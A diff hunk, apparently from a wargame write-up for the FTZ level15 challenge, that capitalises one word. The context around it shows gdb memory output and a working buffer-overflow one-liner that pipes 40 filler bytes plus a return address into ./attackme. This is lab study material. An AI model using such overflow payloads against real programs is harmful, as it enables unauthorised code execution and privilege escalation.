@@ -85,7 +85,7 @@ eip            0x80484b0        0x80484b0
 0x80484b2 <main+34>:    0xdeadbeef      0xec832575      0x0c186808      0x18680000
 ```
 
-the deadbeef's memory is 0x80484b2, so the attack code is 40 bytes dummy strings + "\xb2\x84\x04\x08".
+The deadbeef's memory is 0x80484b2, so the attack code is 40 bytes dummy strings + "\xb2\x84\x04\x08".
 
 ```
 [level15@ftz level15]$ (python -c 'print "A"*40+"\xb2\x84\x04\x08"'; cat) | ./attackme
